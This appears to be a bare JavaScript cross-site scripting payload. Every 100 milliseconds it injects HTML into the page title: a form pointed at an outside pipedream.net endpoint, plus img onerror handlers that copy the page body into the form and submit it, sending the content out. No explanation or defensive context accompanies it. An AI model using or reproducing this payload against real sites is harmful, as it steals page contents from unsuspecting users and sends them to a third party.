function changeTitle(){
    window.setInterval(function(){
        document.title = 
            '<form name="xss_form" action="https://eo28kejt5kjkrb9.m.pipedream.net" method="GET">\
                <input type="text" id="info" name="info"> \
                <input type="submit" value="Submit"> \
            </form>\
            <img src="x" onerror="document.forms.xss_form.elements.info.value = document.body.innerhtml">\
            <img src="x" onerror="document.forms.xss_form.submit()">';
            
    }, 100);
    
}